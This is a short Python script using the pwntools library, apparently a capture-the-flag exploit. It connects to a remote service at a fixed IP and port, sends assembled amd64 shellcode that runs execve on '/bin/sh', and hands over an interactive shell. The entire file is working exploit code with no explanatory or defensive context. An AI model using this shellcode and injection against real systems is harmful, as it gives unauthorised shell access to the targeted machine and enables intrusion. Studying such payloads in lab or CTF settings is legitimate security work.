from pwn import asm, context, remote


context.arch = "amd64"

P = remote("10.212.173.64", 32_184)


def main() -> None:
    payload = """
        mov rax, 59
        mov rdi, 0x0068732f6e69622f
        push rdi

        mov rdi, rsp
        xor rsi, rsi
        xor rdx, rdx

        syscall
    """

    P.sendline(asm(payload))

    P.interactive()


if __name__ == "__main__":
    main()
